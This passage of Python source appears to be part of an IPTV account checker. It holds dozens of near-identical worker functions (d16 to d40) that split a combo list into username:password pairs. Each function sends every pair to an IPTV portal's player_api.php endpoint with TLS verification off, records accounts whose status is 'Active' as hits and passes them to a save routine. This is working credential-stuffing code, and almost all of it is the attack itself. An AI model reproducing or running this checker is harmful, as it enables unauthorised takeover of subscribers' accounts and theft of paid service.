                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d16():
    global hit
    say = 0
    for fyz in range(16, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_16'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d17():
    global hit
    say = 0
    for fyz in range(17, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_17'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d18():
    global hit
    say = 0
    for fyz in range(18, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_18'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d19():
    global hit
    say = 0
    for fyz in range(19, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_19'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d20():
    global hit
    say = 0
    for fyz in range(20, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_20'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d21():
    global hit
    say = 0
    for fyz in range(21, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_21'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d22():
    global hit
    say = 0
    for fyz in range(22, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_22'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d23():
    global hit
    say = 0
    for fyz in range(23, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_23'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d24():
    global hit
    say = 0
    for fyz in range(24, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_24'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d25():
    global hit
    say = 0
    for fyz in range(25, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_25'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d26():
    global hit
    say = 0
    for fyz in range(26, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_26'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d27():
    global hit
    say = 0
    for fyz in range(27, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_27'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d28():
    global hit
    say = 0
    for fyz in range(28, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_28'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d29():
    global hit
    say = 0
    for fyz in range(29, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_29'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d30():
    global hit
    say = 0
    for fyz in range(30, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_30'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d31():
    global hit
    say = 0
    for fyz in range(31, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_31'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d32():
    global hit
    say = 0
    for fyz in range(32, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_32'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d33():
    global hit
    say = 0
    for fyz in range(33, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_33'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d34():
    global hit
    say = 0
    for fyz in range(34, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_34'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d35():
    global hit
    say = 0
    for fyz in range(35, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_35'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d36():
    global hit
    say = 0
    for fyz in range(36, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_36'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d37():
    global hit
    say = 0
    for fyz in range(37, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_37'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d38():
    global hit
    say = 0
    for fyz in range(38, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_38'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d39():
    global hit
    say = 0
    for fyz in range(39, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_39'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d40():
    global hit
    say = 0
    for fyz in range(40, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_40'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

